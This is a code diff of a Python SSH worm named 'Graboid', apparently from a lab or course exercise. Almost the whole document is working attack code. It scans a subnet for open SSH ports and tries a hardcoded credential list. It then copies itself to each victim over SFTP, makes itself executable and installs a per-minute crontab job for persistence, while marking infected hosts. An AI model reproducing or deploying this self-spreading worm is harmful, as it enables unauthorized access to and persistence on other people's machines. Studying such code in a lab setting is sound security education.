@@ -38,7 +38,7 @@ Credential_List = [
 ("earlbas", "P4rd0nMyFr3nch "),
 ("burtgum", "Wr0ngR3cR00m"),
 ("rhonaleb", "RunL1keGDb4st4rds"),
-] #passwords.txt file? maybe
+]
 
 
 #Worm markers
@@ -49,19 +49,12 @@ host_Marker = "/home/kali/Desktop/base.txt"
 worm_Msg = "They say there's nothing new under the sun. But under the ground..."
 comp_Msg = "There be a Graboid in these parts"
 
-#AWS IPs 172.31.19.5 and 172.31.19.92
 
 #Returns list of IP address on the listed network
 def scanner():
   portScanner = nmap.PortScanner()
-  # portScanner.scan("192.168.56.1/24", arguments = "-p 22 --open")
-
   portScanner.scan("172.31.19.1/24", arguments = "-p 22 --open")
 
-  # hosts = [portScanner.all_hosts()]
-  # target = hosts[0]
-
-  # return target
   return portScanner.all_hosts()
 
 #isInfectedSystem
@@ -83,24 +76,10 @@ def isInfected():
 #Spread and execute
 def tunnelexe(sshTGT, sftpTGT):
     try:
-        sftpTGT.put("/tmp/Graboid", "/tmp/" + "Graboid")
-        
-        # sshTGT.exec_command("sudo apt-get -y install python3")
-        # sshTGT.exec_command("sudo apt-get -y install python3-pip")
-        # sshTGT.exec_command("pip install paramiko")
-        # sshTGT.exec_command("pip install netifaces")        
-        # sshTGT.exec_command("python3 -m pip install python-nmap")
+        sftpTGT.put("/tmp/Graboid", "/tmp/" + "Graboid")       
         sshTGT.exec_command('(crontab -l 2>/dev/null; echo "*/1 * * * * /tmp/Graboid > /tmp/test.log") | crontab -')
         sshTGT.exec_command("chmod a+x /tmp/Graboid")
-       # sshTGT.exec_command( "nohup /tmp/Graboid &")
-        #print('started...')
-        
-       # stdin, stdout, stderr = sshTGT.exec_command( "/tmp/Graboid > /tmp/test.log &", get_pty=True)
-       # for line in iter(stdout.readline, ""):
-        #  print(line, end="")
-        #print('finished.')
-      #  sshTGT.exec_command("/tmp/Graboid")
-        
+
     except:
         print(sys.exc_info()[0])
 
@@ -134,11 +113,9 @@ def GraboidATTACK(host):
 
       return None
 
-
+#Determines the ip of the machine it is currently on
 def thisIP(interface):
-  # ip_addr = netifaces.ifaddresses(interface)[2][0]['addr']
-  
-  # return ip_addr if not ip_addr == "127.0.0.1" else None
+ 
   networkInter = netifaces.interfaces()
   ip_addr = ""
   for net in networkInter:
@@ -146,19 +123,8 @@ def thisIP(interface):
     if not addr == "127.0.0.1":
       ip_addr = addr
       break
- 
 
   return ip_addr
-  
-  
-#   for root, dirs, files in os.walk(dir_path):
-#     for file in files:
-#       if file.endswith('.txt'):
-#         return (root+'/'+str(fname))
-#   return None
-
-#file retrieval 
-
 
 
 ### MAIN FUNCTION ###
@@ -182,30 +148,29 @@ def main():
   interface_list.remove(loopback)
   networkHosts = scanner()
   print(interface_list)
+
   for interface in interface_list:
     print("Interface: ", interface)
 
     ip_addr = thisIP(interface)
-   
+  
     print(ip_addr)
-    # networkHosts = scanner()
-  print(networkHosts)
     
+  print(networkHosts)
+
+  #removes current machine's IP
   for ip in networkHosts:
     if ip in ip_addr:
       networkHosts.remove(ip)
       break
     else:
-      continue
-
-    # networkHosts.remove(ip_addr)
+      continue  
     
   #suffle hosts for spreading
   random.shuffle(networkHosts)
 
   print("Found hosts: ", networkHosts)
-
-  # for host in networkHosts:
+  
   sshinfo = GraboidATTACK(networkHosts[0])
   print(sshinfo)
 
@@ -224,7 +189,6 @@ def main():
       print("Graboid was already here!")
     
     sftpTGT.close()
-
 
 ### DUNDER CHECK ###
 if __name__ == "__main__":
